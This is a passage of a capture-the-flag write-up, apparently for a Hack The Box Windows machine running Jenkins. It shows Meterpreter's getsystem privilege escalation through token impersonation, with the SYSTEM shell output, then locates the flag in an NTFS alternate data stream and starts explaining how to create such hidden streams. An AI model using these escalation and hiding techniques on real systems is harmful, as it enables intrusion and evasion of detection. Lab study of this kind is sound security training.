+</span><span class="n">SeImpersonatePrivilege</span><span class="w">        </span><span class="nx">Impersonate</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">after</span><span class="w"> </span><span class="nx">authentication</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeCreateGlobalPrivilege</span><span class="w">       </span><span class="nx">Create</span><span class="w"> </span><span class="nx">global</span><span class="w"> </span><span class="nx">objects</span><span class="w">                     </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w">            </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeTimeZonePrivilege</span><span class="w">           </span><span class="nx">Change</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">time</span><span class="w"> </span><span class="nx">zone</span><span class="w">                      </span><span class="nx">Disabled</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> allows a service to impersonate a client’s security context after the client has authenticated to it. For an attacker, this is exploited by coercing a high-privileged process (like <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>) to connect to a malicious listener. Once the connection is established, the attacker ‘borrows’ that privileged token to execute commands with the authority of the impersonated user. It can be useful if procA (high-privileged) connects to procB (low-privileged) in order to do something without the need of reimplementing <em>all</em> features of procB. It just knocks on procB’s door and tells it “execute your funcA with my security context - on my behalf.”</p>
+
+<p>This can be exploited very easily in metasploit. Just do the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\kohsuke\Desktop&gt;exit
+exit
+meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter &gt; shell
+Process 3500 created.
+Channel 3 created.
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\.jenkins&gt;cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+The system cannot find the file specified.
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          .
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,559,545,344 bytes free
+</code></pre></div></div>
+
+<p>hmm.. No <code class="language-plaintext highlighter-rouge">root.txt</code>. But a <code class="language-plaintext highlighter-rouge">hm.txt</code>, let’s look at it:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">hm.txt</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="n">hm.txt</span><span class="w">
+</span><span class="nx">The</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">elsewhere.</span><span class="w">  </span><span class="nx">Look</span><span class="w"> </span><span class="nx">deeper.</span><span class="w">
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="s2">"Windows 10 Update Assistant.lnk"</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="nx">C:\Windows10Upgrade\Windows10UpgraderApp.exe2..\..\..\Windows10Upgrade\Windows10UpgraderApp.exe</span><span class="o">&amp;</span><span class="nx">/ClientID</span><span class="err">&lt;</span><span class="nx">SNIP</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">71A1-6FA1</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+
+</span><span class="mi">11</span><span class="n">/05/2017</span><span class="w">  </span><span class="nx">10:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">inetpub</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:33</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Jenkins</span><span class="w">
+</span><span class="mi">10</span><span class="n">/30/2015</span><span class="w">  </span><span class="nx">03:24</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">PerfLogs</span><span class="w">
+</span><span class="mi">10</span><span class="n">/26/2017</span><span class="w">  </span><span class="nx">03:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:26</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">06:22</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Users</span><span class="w">
+</span><span class="mi">12</span><span class="n">/24/2017</span><span class="w">  </span><span class="nx">03:53</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows10Upgrade</span><span class="w">
+               </span><span class="mi">0</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">              </span><span class="nx">0</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+               </span><span class="mi">8</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">   </span><span class="nx">2</span><span class="p">,</span><span class="nx">559</span><span class="p">,</span><span class="nx">545</span><span class="p">,</span><span class="nx">344</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Suspicious directory: <code class="language-plaintext highlighter-rouge">C:\Windows10Upgrade</code>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\Windows10Upgrade</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Windows10Upgrade</span><span class="w">
+
+</span><span class="n">C:\Windows10Upgrade</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+ </span><span class="nx">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">71A1-6FA1</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\Windows10Upgrade</span><span class="w">
+
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">.</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">..</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">2052</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">459</span><span class="p">,</span><span class="nx">976</span><span class="w"> </span><span class="nx">appraiserxp.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">118</span><span class="p">,</span><span class="nx">472</span><span class="w"> </span><span class="nx">bootsect.exe</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">24</span><span class="w"> </span><span class="nx">Configuration.ini</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">61</span><span class="p">,</span><span class="nx">640</span><span class="w"> </span><span class="nx">cosquery.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">329</span><span class="p">,</span><span class="nx">928</span><span class="w"> </span><span class="nx">DevInv.dll</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">dll1</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">dll2</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">206</span><span class="p">,</span><span class="nx">536</span><span class="w"> </span><span class="nx">downloader.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">643</span><span class="p">,</span><span class="nx">784</span><span class="w"> </span><span class="nx">DW20.EXE</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">49</span><span class="p">,</span><span class="nx">864</span><span class="w"> </span><span class="nx">DWDCW20.DLL</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">45</span><span class="p">,</span><span class="nx">768</span><span class="w"> </span><span class="nx">DWTRIG20.EXE</span><span class="w">
+</span><span class="mi">06</span><span class="n">/21/2017</span><span class="w">  </span><span class="nx">02:29</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">9</span><span class="p">,</span><span class="nx">810</span><span class="w"> </span><span class="nx">EnableWiFiTracing.cmd</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">68</span><span class="p">,</span><span class="nx">808</span><span class="w"> </span><span class="nx">ESDHelper.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">40</span><span class="p">,</span><span class="nx">648</span><span class="w"> </span><span class="nx">esdstub.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">564</span><span class="p">,</span><span class="nx">936</span><span class="w"> </span><span class="nx">GatherOSState.EXE</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">539</span><span class="p">,</span><span class="nx">848</span><span class="w"> </span><span class="nx">GetCurrentDeploy.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">144</span><span class="p">,</span><span class="nx">072</span><span class="w"> </span><span class="nx">GetCurrentOOBE.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">73</span><span class="p">,</span><span class="nx">416</span><span class="w"> </span><span class="nx">GetCurrentRollback.EXE</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">27</span><span class="p">,</span><span class="nx">848</span><span class="w"> </span><span class="nx">HttpHelper.exe</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">resources</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">63</span><span class="p">,</span><span class="nx">976</span><span class="w"> </span><span class="nx">upgrader_default.log</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">557</span><span class="p">,</span><span class="nx">256</span><span class="w"> </span><span class="nx">wimgapi.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">915</span><span class="p">,</span><span class="nx">656</span><span class="w"> </span><span class="nx">windlp.dll</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">         </span><span class="nx">1</span><span class="p">,</span><span class="nx">415</span><span class="p">,</span><span class="nx">880</span><span class="w"> </span><span class="nx">Windows10UpgraderApp.exe</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">25</span><span class="p">,</span><span class="nx">288</span><span class="w"> </span><span class="nx">WinREBootApp32.exe</span><span class="w">
+</span><span class="mi">07</span><span class="n">/14/2017</span><span class="w">  </span><span class="nx">09:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">25</span><span class="p">,</span><span class="nx">800</span><span class="w"> </span><span class="nx">WinREBootApp64.exe</span><span class="w">
+              </span><span class="mi">23</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">      </span><span class="nx">6</span><span class="p">,</span><span class="nx">389</span><span class="p">,</span><span class="nx">234</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+               </span><span class="mi">6</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">   </span><span class="nx">2</span><span class="p">,</span><span class="nx">559</span><span class="p">,</span><span class="nx">545</span><span class="p">,</span><span class="nx">344</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+
+</span><span class="n">C:\Windows10Upgrade</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+
+</span><span class="n">C:\</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w"> </span><span class="nt">-R</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nt">-R</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">71A1-6FA1</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+
+</span><span class="n">File</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span><span class="w">
+
+</span><span class="n">C:\</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w"> </span><span class="nx">/R</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nx">/R</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">71A1-6FA1</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+
+</span><span class="mi">11</span><span class="n">/05/2017</span><span class="w">  </span><span class="nx">10:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">inetpub</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:33</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Jenkins</span><span class="w">
+</span><span class="mi">10</span><span class="n">/30/2015</span><span class="w">  </span><span class="nx">03:24</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">PerfLogs</span><span class="w">
+</span><span class="mi">10</span><span class="n">/26/2017</span><span class="w">  </span><span class="nx">03:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
+</span><span class="mi">11</span><span class="n">/03/2017</span><span class="w">  </span><span class="nx">10:26</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">06:22</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Users</span><span class="w">
+</span><span class="mi">12</span><span class="n">/24/2017</span><span class="w">  </span><span class="nx">03:53</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows10Upgrade</span><span class="w">
+               </span><span class="mi">0</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">              </span><span class="nx">0</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+               </span><span class="mi">8</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">   </span><span class="nx">2</span><span class="p">,</span><span class="nx">559</span><span class="p">,</span><span class="nx">545</span><span class="p">,</span><span class="nx">344</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+
+</span><span class="n">C:\</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">
+
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w"> </span><span class="nx">/R</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nx">/R</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">71A1-6FA1</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">
+
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">.</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">..</span><span class="w">
+</span><span class="mi">12</span><span class="n">/24/2017</span><span class="w">  </span><span class="nx">03:51</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">36</span><span class="w"> </span><span class="nx">hm.txt</span><span class="w">
+                                    </span><span class="mi">34</span><span class="w"> </span><span class="n">hm.txt:root.txt:</span><span class="nv">$DATA</span><span class="w">
+</span><span class="mi">11</span><span class="n">/08/2017</span><span class="w">  </span><span class="nx">10:05</span><span class="w"> </span><span class="nx">AM</span><span class="w">               </span><span class="nx">797</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">10</span><span class="w"> </span><span class="nx">Update</span><span class="w"> </span><span class="nx">Assistant.lnk</span><span class="w">
+               </span><span class="mi">2</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">            </span><span class="nx">833</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+               </span><span class="mi">2</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">   </span><span class="nx">2</span><span class="p">,</span><span class="nx">559</span><span class="p">,</span><span class="nx">545</span><span class="p">,</span><span class="nx">344</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">hm.txt:root.txt:</span><span class="nv">$DATA</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="n">hm.txt:root.txt:</span><span class="nv">$DATA</span><span class="w">
+</span><span class="n">The</span><span class="w"> </span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">label</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">incorrect.</span><span class="w">
+
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">hm.txt:root.txt</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="n">hm.txt:root.txt</span><span class="w">
+</span><span class="nx">The</span><span class="w"> </span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">label</span><span class="w"> </span><span class="nx">syntax</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">incorrect.</span><span class="w">
+
+</span><span class="n">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">more</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="nx">hm.txt:root.txt</span><span class="w">
+</span><span class="n">more</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="nx">hm.txt:root.txt</span><span class="w">
+</span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We’ve just hit the most famous “troll” in Hack The Box history. <code class="language-plaintext highlighter-rouge">C:\Windows10Upgrade</code> is a massive rabbit hole. It’s just a standard directory left behind by the Windows Update Assistant. There is nothing of value in there. When that note said “Look deeper,” it wasn’t talking about the file system but about <em>the file</em> itself.</p>
+
+<p>After successfully being trolled, the flag can be found in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code> in a so-called <code class="language-plaintext highlighter-rouge">Alternate Data Streams</code> (ADS). ADS was originally designed for compatibility with Apple’s Hierarchical File System (HFS). It allows one filename to point to multiple “forks” of data. Threat actors use ADS to hide malicious code or configuration files inside “innocent” text files or system binaries. Since standard antivirus and users only see the “top” file, it’s a great hiding spot.</p>
+
+<h3 id="alternate-data-streams">Alternate Data Streams</h3>
+
+<p>There are two ways to create / write Alternate Data Streams:</p>
+
+<h4 id="the-cmdexe-way-the-classic">The <code class="language-plaintext highlighter-rouge">cmd.exe</code> Way (The Classic)</h4>
+<p>This is the most common method. You use the redirection operator (<code class="language-plaintext highlighter-rouge">&gt;</code>) followed by the filename, a colon, and the name of your new “hidden” stream.</p>
+
+<ol>
+  <li>Create a “carrier” file:</li>
+</ol>
+
+<pre><code class="language-cmd">echo "This is a normal file." &gt; visible.txt
+</code></pre>
+
+<ol>
+  <li>Attach the hidden stream:</li>
+</ol>
+
+<pre><code class="language-cmd">echo "This is the secret data." &gt; visible.txt:secret
+</code></pre>
+
+<blockquote>
+  <p>Note: If you look at visible.txt now with a standard dir or by opening it in Notepad, you won’t see the secret. The file size will still reflect only the “normal” text.</p>
+</blockquote>
+
+<h4 id="the-powershell-way-the-modern">The PowerShell Way (The Modern)</h4>
+<p>PowerShell has built-in cmdlets specifically for managing streams, which makes it a bit more “official.”</p>
+
+<p>To create a stream:</p>
+
